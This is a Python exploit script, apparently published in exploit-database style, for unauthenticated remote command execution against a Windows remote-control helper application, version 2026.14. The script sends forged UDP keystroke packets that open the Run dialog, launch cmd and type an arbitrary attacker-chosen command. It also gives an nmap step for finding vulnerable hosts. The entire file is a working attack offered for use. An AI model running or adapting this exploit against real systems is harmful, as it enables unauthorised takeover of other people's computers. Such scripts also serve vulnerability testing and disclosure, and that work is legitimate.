#!/usr/bin/env python3
# Exploit Title: Remote Sunrise Helper for Windows 2026.14 - Unauthenticated UDP Input Injection (RCE)
# Date: 2026-04-20
# Exploit Author: Chokri Hammedi
# Software: https://rs.ltd/latest.php?os=win
# Vendor: https://rs.ltd/
# Version: 2026.14
# Tested on: Windows 10 / Windows 11
#
# Identification:
# nmap -p- -T4 <target> --script ssl-cert
# Look for SSL cert with subject: CN=SecureHTTPServer/O=Evgeny Cherpak/C=US

import socket, time, sys, struct

if len(sys.argv) < 4:
    print(f"Usage: {sys.argv[0]} <target_ip> <port> <command>")
    print(f"Example: {sys.argv[0]} 192.168.1.103 49737 'calc'")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
command = sys.argv[3]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def key_press(vk, down):
    packet = b'\x07\x00\x02\x00' + struct.pack('<H', vk) + (b'\x01' if down else b'\x00')
    sock.sendto(packet, (target, port))
    time.sleep(0.05)

def send_text(text):
    for ch in text:
        packet = b'\x06\x00\x03\x00' + ch.encode('utf-16le')
        sock.sendto(packet, (target, port))
        time.sleep(0.02)

print(f"[+] Target: {target}:{port}")

key_press(0x5B, True)
time.sleep(0.05)
key_press(0x52, True)
time.sleep(0.05)
key_press(0x52, False)
time.sleep(0.05)
key_press(0x5B, False)
time.sleep(0.5)

send_text("cmd")
time.sleep(0.3)
key_press(0x0D, True)
key_press(0x0D, False)
time.sleep(0.5)

print(f"[+] Command: {command}")
send_text(command)
time.sleep(0.3)
key_press(0x0D, True)
key_press(0x0D, False)

print("[+] Done")
sock.close()
